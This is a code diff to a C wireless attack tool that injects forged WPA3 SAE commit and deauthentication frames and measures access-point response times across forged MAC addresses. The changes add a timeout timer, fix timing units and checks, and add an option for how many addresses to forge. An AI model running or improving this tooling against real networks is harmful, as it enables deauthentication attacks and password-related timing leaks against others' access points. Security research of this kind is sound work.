@@ -220,6 +220,7 @@ static struct state
 	int num_injected[256];
 	int curraddr;
 	int time_fd_inject;
+	int time_fd_timeout;
 	int num_addresses;
 
 	// TODO: Are these still needed?
@@ -416,6 +417,15 @@ static void inject_sae_commit(struct state *state)
 	if (card_write(state, buf, len, NULL) == -1)
 		perror("card_write");
 
+	struct itimerspec timespec;
+	timespec.it_value.tv_sec = 0;
+	timespec.it_value.tv_nsec = 100 * 1000 * 1000;
+	timespec.it_interval.tv_sec = 0;
+	timespec.it_interval.tv_nsec = 100 * 1000*1000;
+	if (timerfd_settime(state->time_fd_timeout, 0, &timespec, NULL) == -1) {
+		perror("timerfd_settime()");
+	}
+
 	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
 	state->got_reply = 0;
 }
@@ -446,6 +456,15 @@ static void queue_next_commit(struct state *state)
 
 	if (timerfd_settime(state->time_fd_inject, 0, &timespec, NULL) == -1)
 		perror("timerfd_settime()");
+
+	timespec.it_value.tv_sec = 0;
+	timespec.it_value.tv_nsec = 0;
+	timespec.it_interval.tv_sec = 0;
+	timespec.it_interval.tv_nsec = 0;
+	if (timerfd_settime(state->time_fd_timeout, 0, &timespec, NULL) == -1) {
+		perror("timerfd_settime()");
+
+	}
 }
 
 static void check_timeout(struct state *state)
@@ -464,7 +483,7 @@ static void check_timeout(struct state *state)
 		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
 	}
 
-	if (diff.tv_nsec > state->timeout * 1000 * 1000) {
+	if (diff.tv_nsec / (1000 * 1000) + diff.tv_sec * 1000 > state->timeout) {
 		debug(state, 2, "Detected timeout, deauthenticating and queuing next commit\n");
 
 		inject_deauth(state);
@@ -555,7 +574,7 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 			fprintf(state->fp, "STA %02X: %ld\n", state->curraddr, diff.tv_nsec / 1000);
 
 			// Also provide output to the screen			
-			printf("STA %02X: %ld miliseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
+			printf("STA %02X: %ld microseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
 				state->num_injected[state->curraddr]);
 			if (state->curraddr == 0 && state->num_injected[state->num_addresses - 1] > 0) {
 				printf("-------------------------------\n");
@@ -658,7 +677,7 @@ static int card_receive(struct state *state)
 static void event_loop(struct state *state, char * dev, int chan)
 {
 	struct pollfd fds[3];
-	int card_fd, timer_fd;
+	int card_fd ;
 	struct itimerspec timespec;
 
 	// 1. Open the card and get the MAC address
@@ -687,10 +706,12 @@ static void event_loop(struct state *state, char * dev, int chan)
 	state->srcaddr[5] = state->curraddr;
 
 	// 4. Initialize periodic timer to detect timouts
-	timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
-	if (timer_fd == -1)
+	state->time_fd_timeout = timerfd_create(CLOCK_MONOTONIC, 0);
+	if (state->time_fd_timeout == -1) {
 		perror("timerfd_create()");
-	debug(state, 2, "timer_fd = %d\n", timer_fd);
+		return;
+	}
+	debug(state, 2, "timer_fd = %d\n", state->time_fd_timeout);
 
 	/* initial expiration of the timer */
 	timespec.it_value.tv_sec = 1;
@@ -700,12 +721,16 @@ static void event_loop(struct state *state, char * dev, int chan)
 	timespec.it_interval.tv_nsec = 100 * 1000*1000;
 
 	// 5. Initialize timer used to queue a new commit frame to inject
-	if (timerfd_settime(timer_fd, 0, &timespec, NULL) == -1)
+	if (timerfd_settime(state->time_fd_timeout, 0, &timespec, NULL) == -1) {
 		perror("timerfd_settime()");
+		return;
+	}
 
 	state->time_fd_inject = timerfd_create(CLOCK_MONOTONIC, 0);
-	if (timer_fd == -1)
+	if (state->time_fd_timeout == -1) {
 		perror("timerfd_create()");
+		return;
+	}
 
 	// 6. Now start the main event loop
 	printf("Searching for AP ...\n");
@@ -716,7 +741,7 @@ static void event_loop(struct state *state, char * dev, int chan)
 		memset(&fds, 0, sizeof(fds));
 		fds[0].fd = card_fd;
 		fds[0].events = POLLIN;
-		fds[1].fd = timer_fd;
+		fds[1].fd = state->time_fd_timeout;
 		fds[1].events = POLLIN;
 		fds[2].fd = state->time_fd_inject;
 		fds[2].events = POLLIN;
@@ -730,7 +755,7 @@ static void event_loop(struct state *state, char * dev, int chan)
 		// This timer is periodically called, detects timeouts, and implicity starts the attack
 		if (fds[1].revents & POLLIN) {
 			uint64_t exp;
-			assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
+			assert(read(state->time_fd_timeout, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
 			check_timeout(state);
 		}
 
@@ -886,6 +911,7 @@ static void usage(char * p)
 		   "       -v <level>   : Debug level (1 to 3; default: 1)\n"
 		   "       -i <inter>   : Delay between two injects in ms\n"
 		   "       -t <timeout> : Timeout in ms to retransmit commit\n"
+		   "       -n <number>  : Number of MAC addresses to forge\n"
 		   "\n",
 		   version_info);
 	free(version_info);
@@ -909,7 +935,7 @@ int main(int argc, char * argv[])
 	state->timeout = 750;
 	state->num_addresses = 20;
 
-	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:t:o:")) != -1)
+	while ((ch = getopt(argc, argv, "d:hc:v:a:g:r:i:t:o:n:")) != -1)
 	{
 		switch (ch)
 		{
@@ -950,6 +976,14 @@ int main(int argc, char * argv[])
 				state->timeout = atoi(optarg);
 				if (state->timeout < 1) {
 					printf("Please enter a timeout above zero\n");
+					return 1;
+				}
+				break;
+
+			case 'n':
+				state->num_addresses = atoi(optarg);
+				if (state->num_addresses < 1 || state->num_addresses > 255) {
+					printf("Number of addresses to forge out of range [1, 255]\n");
 					return 1;
 				}
 				break;
